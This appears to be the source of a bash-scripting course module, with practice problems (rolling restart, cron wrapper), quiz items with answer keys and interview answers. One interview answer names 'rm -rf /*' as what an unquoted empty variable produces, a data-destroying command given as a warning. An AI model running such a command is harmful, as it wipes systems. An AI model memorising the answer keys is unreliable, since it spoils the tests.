    s: `<p>After a config change, the <code>app</code> service must be restarted on 12 web servers listed in <code>hosts.txt</code> (comments and blank lines allowed). Restart them <b>one at a time</b>; after each restart, wait until <code>http://HOST:8080/health</code> is healthy (max 60 s) before moving on. Stop immediately on the first failure, so at most one server is broken, and print which hosts were done, which failed and which were not touched. Support <code>-n</code> (dry run) and <code>-p SECONDS</code> (pause between hosts). SSH uses keys or an agent; the script must never hang on a password or host-key prompt.</p>`,
    constraints: LAB + ' To practise without servers, point it at <code>localhost</code> twice with a small HTTP server, or stub <code>ssh</code> with a function.',
    ex: `<p>12 hosts, web07 fails its health check: ${H.c('g', 'done: web01 ... web06')}, ${H.c('r', 'FAILED: web07 (unhealthy after 60s)')}, ${H.c('y', 'not touched: web08 ... web12')}, exit 1. The remaining 11 servers still serve traffic.</p>`,
    bw: `<p><code>for h in $(cat hosts.txt); do ssh $h sudo systemctl restart app; done</code>: restarts all servers within seconds (a full outage if the new config is bad), never checks health, may stop at a host-key prompt, and ssh swallows the rest of the loop's input when the loop reads from the file.</p>`,
    bc: B`for h in $(cat hosts.txt); do ssh $h sudo systemctl restart app; done`,
    q: ['Inside <code>while read -r host; do ssh "$host" ...; done &lt; hosts.txt</code>, why does the loop stop after the first host?', ['ssh reads the rest of hosts.txt from stdin; use <code>ssh -n</code> or <code>&lt; /dev/null</code>', 'read only reads one line', 'set -e stops it', 'ssh closes the file'], 0, 'The loop and ssh share stdin, so ssh consumes the remaining lines and sends them to the remote command. -n gives ssh an empty stdin.'],
    h: ['<p>Hint 1: read hosts into an array first (<code>mapfile -t</code> after stripping comments with <code>grep -Ev \'^[[:space:]]*(#|$)\'</code>), so no command inside the loop can eat the list.</p>', '<p>Hint 2: <code>ssh -n -o BatchMode=yes -o ConnectTimeout=5</code>: BatchMode fails instead of prompting. Use <code>StrictHostKeyChecking=yes</code> with a managed known_hosts file rather than turning checking off.</p>', '<p>Hint 3: track three lists (done, failed, untouched). On failure, the untouched list is the rest of the array from the next index: <code>"&#36;{hosts[@]:i+1}"</code>. Print a summary in a function called from the end and from the failure path.</p>'],
    a: `<p>Read and clean the host list into an array, so stdin is not shared with ssh. For each host in order: in dry-run mode just print; otherwise restart over ssh with batch mode, a connect timeout and <code>-n</code>, then poll the health URL with a deadline. Any failure (ssh error or unhealthy) records the host as failed, prints a summary of done, failed and untouched hosts, and exits 1, which caps the damage at one server. A pause between hosts lets caches warm and load balancers notice. Remote commands use <code>sudo</code> with a narrow sudoers rule for exactly <code>systemctl restart app</code> on the servers.</p>`,
    code: B`#!/usr/bin/env bash
# rolling-restart.sh [-n] [-p SECONDS] HOSTS_FILE
set -euo pipefail
dry=0 pause=10
while getopts ':np:' opt; do
  case "$opt" in
    n) dry=1 ;;
    p) pause="$OPTARG" ;;
    *) echo "usage: rolling-restart.sh [-n] [-p SECONDS] HOSTS_FILE" >&2; exit 2 ;;
  esac
done
shift $(( OPTIND - 1 ))
file="\${1:?usage: rolling-restart.sh [-n] [-p SECONDS] HOSTS_FILE}"
[[ $pause =~ ^[0-9]+$ ]] || { echo "pause must be whole seconds" >&2; exit 2; }
mapfile -t hosts < <(grep -Ev '^[[:space:]]*(#|$)' "$file" | tr -d '[:blank:]')
(( \${#hosts[@]} > 0 )) || { echo "no hosts in $file" >&2; exit 2; }

SSH=(ssh -n -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=yes)
done_hosts=()

summary() {                               # summary [FAILED_HOST REASON NEXT_INDEX]
  echo "done: \${done_hosts[*]:-none}"
  if (( $# )); then
    echo "FAILED: $1 ($2)"
    echo "not touched: \${hosts[*]:$3}"
  fi
}

healthy() {                               # healthy HOST -> 0 within 60 s
  local deadline=$(( SECONDS + 60 ))
  until curl -fsS --max-time 3 -o /dev/null "http://$1:8080/health"; do
    (( SECONDS < deadline )) || return 1
    sleep 2
  done
}

for i in "\${!hosts[@]}"; do
  h="\${hosts[i]}"
  if (( dry )); then echo "[dry-run] would restart app on $h"; continue; fi
  echo "restarting app on $h"
  if ! "\${SSH[@]}" "$h" sudo systemctl restart app; then
    summary "$h" "ssh or restart failed" $(( i + 1 )); exit 1
  fi
  if ! healthy "$h"; then
    summary "$h" "unhealthy after 60s" $(( i + 1 )); exit 1
  fi
  done_hosts+=("$h")
  echo "$h healthy"
  if (( i + 1 < \${#hosts[@]} )); then sleep "$pause"; fi
done
summary`,
    cx: `<p>Sequential: about (restart + warm-up + pause) per host, so 12 hosts take a few minutes. That is the price of never having more than one server down.</p>`,
    f: ['How would you take each host out of the load balancer before restarting it and put it back after?', 'How would you restart in batches of 25% instead of one by one, and what does that change about the failure guarantee?']
  }));
  practice.push(P({
    t: 'cronwrap: lock, timeout, log and heartbeat for any cron job', l: 'Hard', tags: ['cron', 'flock', 'timeout', 'logging', 'monitoring'], co: ['Datadog', 'GitLab'],
    s: `<p>Your team has 30 cron jobs, each with its own half-working logging. Write a wrapper so every cron line looks like <code>*/5 * * * * /opt/bin/cronwrap.sh sync-users 240 -- /opt/jobs/sync-users.sh --full</code>. It must:</p>
<ul><li>allow one running copy per job NAME (skip, with a log line, if one is running);</li>
<li>kill the job if it runs longer than TIMEOUT seconds;</li>
<li>append every output line, with a UTC timestamp, to <code>$LOG_DIR/NAME.log</code>;</li>
<li>log start, end, duration and exit code (and say "timed out" for a timeout);</li>
<li>if <code>HEARTBEAT_URL</code> is set (from the environment or <code>/etc/cronwrap/NAME.env</code>), ping it on success and ping <code>$HEARTBEAT_URL/fail</code> on failure;</li>
<li>exit with the job's own exit code.</li></ul>`,
    ex: `<p><code>cronwrap.sh demo 2 -- sleep 5</code> logs ${H.c('b', '2026-03-02T10:00:00Z [demo] start: sleep 5')} then ${H.c('r', '2026-03-02T10:00:02Z [demo] end: exit 124 (timed out after 2s)')}, exit 124. A second copy started meanwhile logs ${H.c('y', '[demo] already running, skipping')}, exit 0.</p>`,
    bw: `<p>Each job reinvents locking with pid files that go stale after a crash, logs nothing or everything to <code>/dev/null</code>, hangs forever on a stuck network call (and then every later run piles up behind it), and nobody notices when a job silently stops running.</p>`,
    q: ['What exit code does <code>timeout 2 sleep 5</code> return?', ['124', '0', '137', '143'], 0, 'GNU timeout exits 124 when the time limit was reached and it sent its signal (SIGTERM by default). With --kill-after, a job that ignores SIGTERM is killed and timeout exits 137.'],
    h: ['<p>Hint 1: parse <code>NAME TIMEOUT --</code> and keep the rest as the command in <code>"$@"</code>. Validate NAME with <code>^[a-z0-9_-]+$</code>, because it becomes part of file names.</p>', '<p>Hint 2: lock with <code>exec 9&gt; "$LOCK_DIR/$name.lock"; flock -n 9</code>. Run <code>timeout --kill-after=30 "$t" "$@" 2&gt;&amp;1 | while IFS= read -r line; do ... done &gt;&gt; "$log"</code> and read the job\'s code from <code>&#36;{PIPESTATUS[0]}</code>.</p>', '<p>Hint 3: the job inherits fd 9, so the lock stays held until the job and all its children have exited, which is exactly what you want. Ping the heartbeat with <code>curl -fsS --max-time 10 --retry 2</code>, and never let a heartbeat failure change the job\'s exit code.</p>'],
    a: `<p>Validate arguments, load optional per-job settings from a root-owned env file, and open a per-job lock with <code>flock -n</code> so overlapping runs are skipped (and logged). Write start and end lines with timestamps. Run the command under <code>timeout --kill-after</code>, merge its stdout and stderr, and timestamp each line on its way into the log. <code>PIPESTATUS[0]</code> gives the job's real exit code even though it is the first stage of a pipe. Map 124 and 137 to a "timed out" message. Duration comes from <code>SECONDS</code>. The heartbeat call is best-effort and separated from the job's result, and the wrapper exits with the job's own code so cron mail or other tools still see failures.</p>`,
    code: B`#!/usr/bin/env bash
# cronwrap.sh NAME TIMEOUT_SECONDS -- COMMAND [ARGS...]
set -uo pipefail                              # no -e: we must always reach the end and log the result

usage() { echo "usage: cronwrap.sh NAME TIMEOUT_SECONDS -- COMMAND [ARGS...]" >&2; exit 2; }
(( $# >= 4 )) || usage
name="$1" limit="$2"
[[ $3 == -- ]] || usage
shift 3
[[ $name =~ ^[a-z0-9_-]+$ ]] || { echo "NAME may use a-z 0-9 _ - only" >&2; exit 2; }
[[ $limit =~ ^[1-9][0-9]*$ ]] || { echo "TIMEOUT must be a positive number of seconds" >&2; exit 2; }

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LOG_DIR="\${LOG_DIR:-/var/log/cronwrap}"
LOCK_DIR="\${LOCK_DIR:-/run/lock}"
env_file="/etc/cronwrap/$name.env"            # optional, root-owned: HEARTBEAT_URL=...
if [[ -r $env_file ]]; then . "$env_file"; fi
mkdir -p "$LOG_DIR"
log="$LOG_DIR/$name.log"

stamp() { date -u +%FT%TZ; }
say()   { printf '%s [%s] %s\n' "$(stamp)" "$name" "$*" >> "$log"; }

exec 9> "$LOCK_DIR/cronwrap-$name.lock"
if ! flock -n 9; then say "already running, skipping"; exit 0; fi

say "start: $*"
start=$SECONDS
timeout --kill-after=30 "$limit" "$@" 2>&1 |
  while IFS= read -r line; do printf '%s [%s] %s\n' "$(stamp)" "$name" "$line"; done >> "$log"
rc=\${PIPESTATUS[0]}
took=$(( SECONDS - start ))

case $rc in
  0)       say "end: exit 0 after \${took}s" ;;
  124|137) say "end: exit $rc (timed out after \${limit}s)" ;;
  *)       say "end: exit $rc after \${took}s" ;;
esac

if [[ -n \${HEARTBEAT_URL:-} ]]; then
  url="$HEARTBEAT_URL"; (( rc == 0 )) || url="$HEARTBEAT_URL/fail"
  curl -fsS --max-time 10 --retry 2 -o /dev/null "$url" || say "heartbeat ping failed (job result unchanged)"
fi
exit "$rc"`,
    cx: `<p>Overhead per run: one lock, one timeout process and a <code>date</code> call per output line (fine for normal job output; for jobs that print thousands of lines per second, use <code>ts</code> from moreutils or <code>awk</code> with <code>strftime</code> instead).</p>`,
    f: ['How would you rotate the per-job logs this wrapper creates?', 'Which of these features would a systemd timer and service give you for free?']
  }));

  // ───────────────────────── Quiz ─────────────────────────
  quiz.push({ q: 'A variable holds <code>f="Q1 report.csv"</code>. What does <code>cp $f /backup/</code> do?', options: ['Tries to copy two files, <code>Q1</code> and <code>report.csv</code>', 'Copies the file correctly', 'Fails with a syntax error', 'Copies the file and renames it'], answer: 0, explain: 'Unquoted, the value is split on the space into two arguments. <code>cp "$f" /backup/</code> passes it as one argument.' });
  quiz.push({ q: 'What does <code>rm -rf -- "&#36;{DIR:?DIR is empty}"/cache</code> do when DIR is empty?', options: ['Stops the script with "DIR is empty" before rm runs', 'Deletes <code>/cache</code>', 'Deletes the current folder', 'Does nothing and continues'], answer: 0, explain: 'The :? expansion prints the message and exits a non-interactive shell when the variable is unset or empty, so rm never sees a dangerous path.' });
  quiz.push({ q: 'A cron job fails with exit status <b>127</b>. What is the most likely cause?', options: ['A command was not found on cron\'s short PATH', 'The job was killed by the OOM killer', 'A permission problem on a file it reads', 'The disk is full'], answer: 0, explain: '127 means "command not found". Cron\'s PATH is typically just /usr/bin:/bin, so tools in /usr/local/bin or /snap/bin are missing. 137 would be SIGKILL, often the OOM killer.' });
  quiz.push({ q: 'Without <code>pipefail</code>, what is the exit status of <code>pg_dump db | gzip &gt; db.gz</code> when pg_dump fails and gzip succeeds?', options: ['0', '1', '2', '141'], answer: 0, explain: 'A pipeline returns the status of its last command, gzip, which succeeded. With <code>set -o pipefail</code> it returns pg_dump\'s non-zero code.' });
  quiz.push({ q: 'Which line sends both stdout and stderr of <code>job</code> into <code>job.log</code>?', options: ['<code>job &gt; job.log 2&gt;&amp;1</code>', '<code>job 2&gt;&amp;1 &gt; job.log</code>', '<code>job | tee job.log</code>', '<code>job 2&gt; job.log</code>'], answer: 0, explain: 'Redirections apply left to right: stdout goes to the file, then stderr is pointed where stdout now points. The second version points stderr at the terminal first. tee only gets stdout.' });
  quiz.push({ q: 'Under <code>set -euo pipefail</code>, with <code>count=0</code>, what happens on <code>(( count++ ))</code>?', options: ['The script exits, because the expression evaluates to 0 and returns status 1', 'count becomes 1 and the script continues', 'A syntax error', 'count stays 0 and the script continues'], answer: 0, explain: 'Post-increment yields the old value, 0, and (( )) returns 1 for a zero result, which set -e treats as a failure. Use <code>count=$(( count + 1 ))</code>.' });
  quiz.push({ q: 'When does a <code>trap cleanup EXIT</code> handler run?', options: ['Whenever the script exits: normal end, exit N, a set -e failure, or after INT/TERM handling', 'Only when the script ends normally', 'Only on Ctrl+C', 'Also on kill -9'], answer: 0, explain: 'EXIT is a pseudo-signal that fires on every way out of the shell. SIGKILL cannot be trapped, so nothing runs on kill -9.' });
  quiz.push({ q: 'In a function, how do you pass on all its arguments to another command unchanged?', options: ['<code>"$@"</code>', '<code>$*</code>', '<code>"$*"</code>', '<code>$@</code>'], answer: 0, explain: '"$@" expands to each argument as its own word, preserving spaces. "$*" glues them into one string; unquoted forms split them again.' });
  quiz.push({ q: 'Which crontab line runs a job at 02:30 every day?', options: ['<code>30 2 * * *</code>', '<code>2 30 * * *</code>', '<code>* 2 * * *</code>', '<code>30 2 * * 0</code>'], answer: 0, explain: 'Fields are minute, hour, day of month, month, day of week. <code>* 2 * * *</code> runs every minute from 02:00 to 02:59; the last option only runs on Sundays.' });
  quiz.push({ q: 'A crontab line contains <code>date +%F</code> and never works from cron. Why?', options: ['In crontab, % is turned into a newline, so the command is cut short; escape it as \\%', 'cron does not have date', 'date needs sudo under cron', '%F is not a valid format'], answer: 0, explain: 'Cron treats unescaped % as a newline and passes the rest as stdin. Escape it or move the command into a script.' });
  quiz.push({ q: 'Which way of adding a line to a config file is idempotent?', options: ['<code>grep -qxF -- "$line" file || echo "$line" &gt;&gt; file</code>', '<code>echo "$line" &gt;&gt; file</code>', '<code>echo "$line" &gt; file</code>', '<code>sed -i "\\$a $line" file</code>'], answer: 0, explain: 'It appends only when the exact line is missing, so repeated runs leave one copy. Plain append duplicates; overwriting with &gt; destroys the rest of the file; sed $a appends every time.' });
  quiz.push({ q: 'Why does a safe deploy switch the <code>current</code> symlink with <code>ln -sfn new current.new &amp;&amp; mv -T current.new current</code> instead of just <code>ln -sfn new current</code>?', options: ['rename (mv) replaces the link in one atomic step; ln -sf removes and recreates it, leaving a short gap', 'mv is faster than ln', 'ln cannot overwrite symlinks', 'It keeps a backup of the old link'], answer: 0, explain: 'ln -sf does unlink then symlink, so for a moment the path does not exist and a request can fail. rename() swaps the name atomically.' });

  // ───────────────────────── Interview ─────────────────────────
  interview.push({ level: 'B', q: 'Why do you quote variables in bash, and when would you not?', a: `<p>Without quotes, bash performs word splitting and globbing on a variable's value after expanding it: a file name with a space becomes two arguments, and a <code>*</code> in the value expands to matching files. An empty unquoted variable disappears completely, which is how <code>rm -rf $DIR/*</code> turns into <code>rm -rf /*</code>. So I quote by default: <code>"$f"</code>, <code>"$(cmd)"</code>, <code>"&#36;{arr[@]}"</code>, and I guard required values with <code>&#36;{VAR:?msg}</code> and <code>set -u</code>. I leave quotes off only when I want splitting or globbing on purpose, for example a glob in <code>for f in /var/log/*.log</code>, or inside <code>[[ ]]</code> and <code>(( ))</code> where splitting does not happen. ShellCheck in CI catches the rest.</p>`, followUps: ['What does <code>"&#36;{arr[*]}"</code> give you compared to <code>"&#36;{arr[@]}"</code>?', 'Why should you never write <code>for f in $(ls)</code>?'] });
  interview.push({ level: 'B', q: 'What are exit codes, and how does a script use them?', a: `<p>Every command finishes with a number from 0 to 255: 0 means success, anything else failure. <code>$?</code> holds the last one. Some values are conventions: 1 is a general error, 2 is misuse, 126 is "not executable", 127 is "command not found", and 128+N means "killed by signal N", so 137 is SIGKILL (often the OOM killer) and 143 is SIGTERM. Scripts branch on codes with <code>if cmd; then</code>, <code>cmd || exit 1</code>, or <code>case $? in</code>, never by parsing printed text. My own scripts exit with meaningful codes (for example 0 OK, 1 failure, 2 bad usage, or the Nagios 0/1/2/3 convention for checks), because cron, systemd, CI pipelines and monitoring all read them. One gotcha: grep returns 1 for "no match", which is not an error, so I handle that case explicitly.</p>`, followUps: ['What does exit status 130 tell you?', 'Why do you need to save <code>$?</code> immediately?'] });
  interview.push({ level: 'B', q: 'A script works when you run it by hand but fails from cron. How do you troubleshoot?', a: `<p>Cron gives the job a minimal environment, so I check the usual differences. PATH is usually just <code>/usr/bin:/bin</code>, so tools in <code>/usr/local/bin</code> or <code>/snap/bin</code> are not found (exit 127). The shell is <code>/bin/sh</code>, which is dash on Ubuntu, so bash syntax and <code>source</code> fail. The working directory is the home folder, so relative paths break. Exported variables from my terminal (AWS profile, tokens, proxies) are missing. And an unescaped <code>%</code> on the cron line becomes a newline. First I make the failure visible: redirect the job's output to a log (<code>&gt;&gt; /var/log/job.log 2&gt;&amp;1</code>) and check <code>journalctl -u cron</code> or <code>/var/log/cron</code> to confirm it even ran. Then I reproduce it with <code>env -i HOME=$HOME PATH=/usr/bin:/bin /bin/sh -c '...'</code>. The fix is a script with a bash shebang, its own PATH, absolute paths, config from a named file, and a lock.</p>`, followUps: ['How would you find out whether the job ran at all?', 'Why would you consider a systemd timer instead?'] });
  interview.push({ level: 'B', q: 'What does <code>set -euo pipefail</code> do, and why do you use it?', a: `<p>It switches bash into a strict mode. <code>-e</code> exits as soon as a command fails, instead of carrying on with a broken state. <code>-u</code> makes using an unset variable an error, which catches typos and missing config before they become an <code>rm</code> on the wrong path. <code>-o pipefail</code> makes a pipeline fail if any stage fails, not just the last one; without it, <code>pg_dump | gzip</code> reports success even when the dump failed. I add an ERR trap that prints <code>$LINENO</code> and <code>$BASH_COMMAND</code> so the log says where it broke, and an EXIT trap for cleanup. I also know its limits: -e is ignored in <code>if</code> conditions, <code>&amp;&amp;</code>/<code>||</code> lists and functions called from them, and <code>local x=$(cmd)</code> hides failures, so I still verify important results explicitly.</p>`, followUps: ['Give an example where set -e does not stop a failing command.', 'Why can pipefail make <code>cmd | head -n 1</code> fail?'] });
  interview.push({ level: 'B', q: 'How do you pass a secret, such as an API token, to a bash script safely?', a: `<p>Never in the script itself, because scripts live in Git and get copied around. The script reads it from the environment, with a guard that fails clearly if it is missing: <code>: "&#36;{API_TOKEN:?set API_TOKEN}"</code>. The environment is filled by whatever runs the script: a CI secret, a systemd <code>EnvironmentFile</code> or credential readable only by the service user, or, best, fetched at run time from a secrets manager (AWS Secrets Manager, SSM Parameter Store, Vault) using the machine's role, so no long-lived key is stored at all. Inside the script I never echo it, never use <code>set -x</code> around it, and avoid putting it on a command line where <code>ps</code> can show it; I pass it via stdin, a header file with mode 600, or an environment variable for that one command. Logs get only "token set (N chars)".</p>`, followUps: ['Why is <code>curl -H "Authorization: Bearer $TOKEN"</code> slightly risky on a shared host?', 'How would you rotate the token without editing the script?'] });
  interview.push({ level: 'I', q: 'Explain the difference between <code>&gt; file 2&gt;&amp;1</code> and <code>2&gt;&amp;1 &gt; file</code>.', a: `<p>Redirections are processed left to right, and <code>2&gt;&amp;1</code> means "make fd 2 point wherever fd 1 points right now". In <code>&gt; file 2&gt;&amp;1</code>, stdout is first pointed at the file, then stderr copies that, so both go to the file: this is what you want for cron logs. In <code>2&gt;&amp;1 &gt; file</code>, stderr first copies stdout's current target, the terminal, and only then is stdout moved to the file; errors still go to the terminal (or, under cron, to mail or nowhere). Bash's <code>&amp;&gt; file</code> is shorthand for the correct form. In scripts I often re-plumb once at the top with <code>exec &gt;&gt; "$LOG" 2&gt;&amp;1</code>, or <code>exec &gt; &gt;(tee -a "$LOG") 2&gt;&amp;1</code> to keep the screen output too.</p>`, followUps: ['How do you send only stderr through a pipe?', 'Why does <code>sudo echo x &gt; /etc/file</code> fail?'] });
  interview.push({ level: 'I', q: 'How do you make sure a temp file or lock is cleaned up even when the script fails or is interrupted?', a: `<p>Create it with <code>mktemp</code> or <code>mktemp -d</code> (unique, unpredictable name, private permissions), and on the very next line register <code>trap cleanup EXIT</code>, where <code>cleanup</code> removes it. The EXIT trap runs on a normal end, on <code>exit N</code>, on a <code>set -e</code> failure, and after INT or TERM handlers that call <code>exit</code>. Inside the trap I save <code>$?</code> first so the original exit code is preserved. For locks I prefer <code>flock</code> on a file descriptor over "create a lock file and delete it later", because the kernel releases a flock when the process dies, even after <code>kill -9</code>, which no trap can catch. Remaining risks: a trap only runs between commands, so a long foreground child delays it, and only one handler per signal exists, so I keep a single cleanup function.</p>`, followUps: ['Why should temp files not have fixed names like /tmp/backup.tmp?', 'What exit code should a script use after catching SIGTERM?'] });
  interview.push({ level: 'I', q: 'What does idempotent mean for an operations script? Give examples.', a: `<p>Running it once or many times leaves the system in the same final state, and later runs do nothing if nothing needs doing. It matters because automation gets retried: CI timeouts, dropped SSH sessions, colleagues re-running. Examples: <code>mkdir -p</code> instead of <code>mkdir</code>; <code>id -u app || useradd app</code>; <code>grep -qxF -- "$line" f || echo "$line" &gt;&gt; f</code> instead of a blind append; <code>ln -sfn</code> for links; writing whole config files we own, comparing with <code>cmp -s</code>, and reloading the service only when the file changed. Deploys use release folders and an atomic symlink switch, and exit early if the requested version is already live. My test is simple: run it twice and expect "0 changes", and kill it halfway, then run it again and expect it to finish cleanly.</p>`, followUps: ['How do Ansible modules achieve idempotence?', 'What makes "check then act" unsafe when two copies run at once?'] });
  interview.push({ level: 'I', q: 'How would you write a log rotation setup for an application?', a: `<p>On a normal server, with a logrotate rule in <code>/etc/logrotate.d/app</code>: when to rotate (<code>daily</code> or <code>weekly</code>, plus <code>maxsize</code> for spikes), how many to keep (<code>rotate 14</code>), <code>compress</code> with <code>delaycompress</code>, <code>missingok</code>, <code>notifempty</code>, and how the app learns about the new file. If the app can reopen its log (on SIGHUP or reload), I use <code>create 0640 app adm</code> and a <code>postrotate</code> script; if it cannot, <code>copytruncate</code>, accepting that a few lines can be lost. I test with <code>logrotate -d</code> (dry run) and <code>-f</code> (force), and check that the app keeps writing to the new file. Without root, logrotate works with a user config and <code>-s</code> state file from the user's crontab. Better still, apps that log to stdout under systemd or Docker get rotation from journald or the container runtime, and logs are shipped to a central system before old files are deleted.</p>`, followUps: ['What happens if you rotate with create but the app does not reopen its log?', 'How do you limit Docker container log size?'] });
  interview.push({ level: 'I', q: 'How do you stop a cron job from running twice at the same time?', a: `<p>Use <code>flock</code>. Either on the cron line, <code>flock -n /run/lock/job.lock /opt/scripts/job.sh</code>, or inside the script: <code>exec 9&gt; /run/lock/job.lock; flock -n 9 || { echo "already running"; exit 0; }</code>. <code>-n</code> means "do not wait; give up at once if locked", and I log that so a job that is always skipped gets noticed. The kernel holds the lock as long as the file descriptor is open and releases it automatically when the process ends, even if it is killed, so there are no stale lock files to clean up. A pid-file approach needs checks like "is that pid still alive and is it really my job", which is easy to get wrong. If the job runs on several servers, a local lock is not enough: I need a distributed lock (a database row, DynamoDB conditional write, Consul) or a scheduler that runs it in exactly one place. I also add a <code>timeout</code> so one stuck run cannot block all later ones forever.</p>`, followUps: ['Why is a lock not enough if a job regularly runs longer than its interval?', 'How would you know if the job has been skipped for a day?'] });
  interview.push({ level: 'A', q: 'Walk me through how you would write a safe deploy script for a single server.', a: `<p>Inputs first: validate the version format, require config via environment with <code>:?</code> guards, take a <code>flock</code> so only one deploy runs, and use <code>set -Eeuo pipefail</code> with an ERR trap that logs the failing line. Idempotence: if <code>current</code> already points at this release, exit 0. Then verify the artifact's checksum, unpack it into a temp folder inside <code>releases/</code> and <code>mv</code> it to <code>releases/VERSION</code>, so a release is complete or absent. Record the previous target, switch the symlink atomically (<code>ln -sfn</code> to a temp name plus <code>mv -T</code>), restart or reload, and poll a health endpoint with a deadline. On failure, switch back to the previous release, restart, and exit non-zero so CI marks the deploy failed. Config files the deploy owns are written whole and replaced only when changed. Finally prune old releases, never the current or previous. Add a <code>--dry-run</code> mode, ShellCheck in CI, and a test that runs the deploy twice and kills it halfway once.</p>`, followUps: ['How would you get zero downtime when the restart itself drops connections?', 'At what point would you replace this script with a proper deploy tool?'] });
  interview.push({ level: 'A', q: 'What are the main pitfalls of <code>set -e</code>, and how do you write scripts that handle errors well despite them?', a: `<p>set -e is disabled in many contexts: commands tested by <code>if</code>/<code>while</code>/<code>until</code>, anything left of <code>&amp;&amp;</code> or <code>||</code>, and the whole body of a function called from such a context. <code>local x=$(cmd)</code> and <code>export x=$(cmd)</code> return the status of local/export, so failures vanish. Command substitutions do not inherit -e unless <code>shopt -s inherit_errexit</code>. Arithmetic like <code>(( n++ ))</code> with n=0 returns 1 and kills the script unexpectedly. Pipelines need pipefail, and pipefail in turn makes <code>producer | head</code> fail with SIGPIPE (141). My approach: keep <code>set -Eeuo pipefail</code> as a net, add an ERR trap with line numbers, split <code>local x; x=$(cmd)</code>, use explicit <code>if ! cmd; then ...; fi</code> for important steps with meaningful messages, document every intentional <code>|| true</code>, and verify outputs (sizes, checksums, health checks) because "no command failed" is not the same as "it worked". For loops over many hosts, I drop -e and handle each failure deliberately.</p>`, followUps: ['How does ShellCheck help with these?', 'When would you rewrite a bash script in Python instead?'] });
  interview.push({ level: 'E', q: 'How do AI assistants change bash scripting for operations, and how do you use them safely?', a: `<p>They write the boilerplate very well: argument parsing, usage text, logging helpers, retry loops, cron expressions and logrotate rules appear in seconds, and they explain cryptic constructs or exit codes instantly. That moves my time from typing to reviewing and testing. The risks are predictable: missing quotes, loops without limits, <code>|| true</code> sprinkled to silence errors, blind appends that break idempotence, cleanup at the end of the script instead of in a trap, hardcoded example credentials and <code>set -x</code> around secrets, and assumptions about my interactive environment that fail under cron. So I treat AI output like a junior colleague's pull request: ShellCheck in CI, run it twice to prove idempotence, test the failure paths (kill it halfway, break a dependency), run it in a throwaway container first, and never paste real secrets or customer logs into an external tool. When an agent can execute scripts, it gets a sandbox, least-privilege credentials, dry-run modes and human approval for destructive steps.</p>`, followUps: ['What would you put in a review checklist for AI-generated scripts?', 'How do you decide whether a task should be a bash script, a Python tool or an Ansible playbook?'] });

  // ───────────────────────── Module registration ─────────────────────────
  registerModule({
    id: 'devops02',
    title: 'Bash Scripting for Operations',
    lang: 'bash',
    intro: `<p>Sooner or later every cloud support engineer and junior DevOps engineer turns a list of commands into a script. Usually it is a backup, a cleanup, a health check or a deploy, and it runs at 3 a.m. with nobody watching. This module teaches you to write those scripts so they <b>work, fail loudly, clean up after themselves and are safe to run again</b>: variables and quoting, exit codes, conditionals and loops, functions and arguments, pipes and redirection, <code>set -euo pipefail</code>, traps, cron jobs, log rotation and idempotent deploys.</p>
      <p>Every topic starts from a real incident: the cleanup script that deleted the wrong folder, the backup that "succeeded" for three weeks while uploading empty files, the cron job that works by hand but not from cron, the deploy that broke when CI retried it. Scripts are self-contained where possible, and their output is shown. All labs run on <b>your own Linux machine, WSL or a throwaway container</b> (<code>docker run -it --rm ubuntu:24.04 bash</code>). No cloud account is needed, and no real secrets are ever used: configuration comes from environment variables such as <code>API_TOKEN</code>, checked with <code>&#36;{API_TOKEN:?}</code>.</p>`,
    goals: [
      'Quote variables correctly, use parameter expansion for defaults, required values and string surgery, and keep lists in arrays so file names with spaces never break a script',
      'Read and set exit codes, branch with <code>if</code>, <code>[[ ]]</code>, <code>case</code>, <code>&amp;&amp;</code> and <code>||</code>, and write bounded retry loops with backoff',
      'Structure a script as a small tool: functions with <code>local</code> variables, <code>"$@"</code>, getopts options, usage text, <code>log</code>/<code>die</code> helpers and <code>main "$@"</code>',
      'Plumb stdout and stderr deliberately: whole-script logging with <code>exec</code> and <code>tee</code>, here-docs for config files, <code>sudo tee</code>, and process substitution',
      'Make scripts fail loudly with <code>set -euo pipefail</code>, ERR traps with line numbers and verified results, and clean up with <code>mktemp</code> plus <code>trap ... EXIT</code>, knowing where <code>set -e</code> looks away',
      'Schedule jobs with cron that survive cron\'s minimal environment, prevent overlaps with <code>flock</code>, and keep logs bounded with logrotate or a hand-written rotation',
      'Write idempotent, re-runnable scripts and deploys: ensure-style helpers, compare-then-replace config, atomic release switches with rollback, dry-run modes and locks'
    ],
    prereqs: `Required: <b>Cloud &amp; DevOps 1</b> (Linux for the Cloud): navigating the filesystem, permissions, processes and systemd services, and the text tools (grep, awk, sort) this module uses inside scripts. Helpful: <b>CS Core 8</b> (Linux Internals &amp; Shell) for what file descriptors, signals and <code>trap</code> mean at the kernel level. This module builds on both with hands-on operations scripting instead of repeating them.`,
    hours: 10,
    topics: topics,
    practice: practice,
    quiz: quiz,
    interview: interview
  });
})();
